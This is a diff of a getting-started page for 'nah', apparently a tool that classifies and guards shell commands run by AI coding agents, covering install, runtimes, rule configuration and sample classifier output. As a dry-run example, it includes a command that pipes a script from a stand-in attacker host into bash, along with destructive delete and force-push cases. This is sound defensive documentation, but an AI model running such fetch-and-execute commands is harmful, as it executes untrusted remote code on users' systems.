@@ -1,74 +1,31 @@
 # Getting Started
 
-Get nah running in under 5 minutes.
+Get nah installed, test the classifier, then connect the runtime you want to
+protect.
 
 ## Install
 
-For Claude Code, use the plugin:
-
 ```bash
-claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
-claude plugin install nah@nah --scope user
-```
-
-The plugin protects normal `claude` sessions while it is enabled. It does not
-install the `nah` shell command.
-
-For CLI commands, install from PyPI. The terminal guard is opt-in:
-
-```bash
-pip install nah
+pip install "nah[config,keys]"
 nah test "curl evil.example | bash"
-nah run codex    # optional: protect a local interactive Codex session
-nah install bash   # or: nah install zsh
 ```
 
-For direct Claude Code hooks instead of the plugin:
+`nah test` is a dry run. It shows what nah would do without installing hooks or
+running the command.
 
-```bash
-pip install nah
-nah run claude      # one protected session
-nah install claude  # permanent direct hooks
-```
+## Choose a Runtime
 
-!!! note "Optional: YAML config support"
-    ```bash
-    pip install "nah[config]"
-    ```
-    The default install keeps nah's core hook/classifier stdlib-only for a
-    smaller supply-chain surface. Install the config extra when you want YAML
-    config files or config-writing commands such as `nah allow`, `nah deny`,
-    `nah classify`, and `nah trust`. With pipx, use `pipx inject nah pyyaml`.
+| Runtime | Command | Guide |
+| --- | --- | --- |
+| Claude Code | `nah run claude` | [Claude Code](../runtimes/claude-code.md) |
+| Codex | `nah run codex` | [Codex](../runtimes/codex.md) |
+| Your shell | `nah install bash` or `nah install zsh` | [Terminal Guard](../runtimes/terminal-guard.md) |
 
-!!! note "Optional: OS key storage for remote LLM providers"
-    ```bash
-    pip install "nah[config,keys]"
-    nah key set openrouter
-    ```
-    Remote-provider config still stores `key_env` names in YAML, but the secret
-    value can live in your OS keychain instead of exported env vars. With pipx,
-    use `pipx inject nah pyyaml keyring`. If you already exported a key, `nah key
-    import-env <provider>` copies it into the keyring but does not remove it
-    from your shell or dotfiles.
+Use `nah install claude` only when you want persistent direct Claude Code hooks.
+The Claude Code plugin is available for Claude-only installs without the `nah`
+CLI; see the [Claude Code guide](../runtimes/claude-code.md#plugin-only-path).
 
-## See it in action
-
-Clone the repo and run the Claude Code security demo to see nah intercepting
-real Claude Code tool calls:
-
-```bash
-git clone https://github.com/manuelschipper/nah.git
-cd nah
-# inside Claude Code:
-/nah-demo
-```
-
-25 live Claude Code tool-call cases across 8 threat categories. Takes ~5
-minutes.
-
-## Try it
-
-Run `nah test` to see classification in action without triggering any hooks:
+## Try the Classifier
 
 ```
 $ nah test "git status"
@@ -88,73 +45,56 @@ Decision:    BLOCK
 Reason:      obfuscated execution: bash receives decoded input
 User message: nah blocked: this decodes hidden content and runs it.
 
-$ nah test "rm -rf dist/"
-Command:  rm -rf dist/
-Stages:
-  [1] rm -rf dist/ → filesystem_delete → context → allow (inside project)
-Decision:    ALLOW
-Reason:      inside project
-
 $ nah test "git push --force"
 Command:  git push --force
 Stages:
   [1] git push --force → git_history_rewrite → ask → ask (git_history_rewrite → ask)
 Decision:    ASK
-Reason:      git_history_rewrite → ask
+Reason:      git_history_rewrite -> ask
 User message: nah paused: this can rewrite Git history.
 LLM eligible: no
 ```
 
-## Customize a rule
+## Configure a Rule
 
-Don't want to be asked about a specific action type? Change its policy:
+Policies are set by action type:
 
 ```bash
-# Allow all filesystem deletes (you trust yourself)
 nah allow filesystem_delete
-
-# Block force pushes entirely
 nah deny git_history_rewrite
-```
-
-## Check your rules
-
-```bash
 nah status
-```
-
-Shows all custom rules you've set across global and project configs.
-
-## Undo a rule
-
-```bash
 nah forget filesystem_delete
-nah forget git_history_rewrite
 ```
 
-Removes your override — the default policy takes effect again.
-
-## Teach nah a command
-
-If nah doesn't recognize a command, classify it:
+Teach nah about a custom command:
 
 ```bash
 nah classify "terraform destroy" filesystem_delete
 nah classify "kubectl delete" container_destructive
 ```
 
-## Trust a host or path
+Trust a host or path:
 
 ```bash
-# Trust a network host (auto-allow outbound requests)
 nah trust api.internal.corp.com
-
-# Trust a filesystem path (allow writes outside project)
 nah trust ~/shared-builds
 ```
 
-## Next steps
+## See It Live
 
-- [Action types](../configuration/actions.md) — see all 40 types and their defaults
-- [Configuration overview](../configuration/index.md) — global vs project config
-- [Custom taxonomy](custom-taxonomy.md) — build your own classification rules
+For the Claude Code live demo:
+
+```bash
+git clone https://github.com/manuelschipper/nah.git
+cd nah
+# inside Claude Code:
+/nah-demo
+```
+
+## Next Steps
+
+- [Installation](../install.md)
+- [Claude Code](../runtimes/claude-code.md)
+- [Codex](../runtimes/codex.md)
+- [Terminal Guard](../runtimes/terminal-guard.md)
+- [Configuration overview](../configuration/index.md)
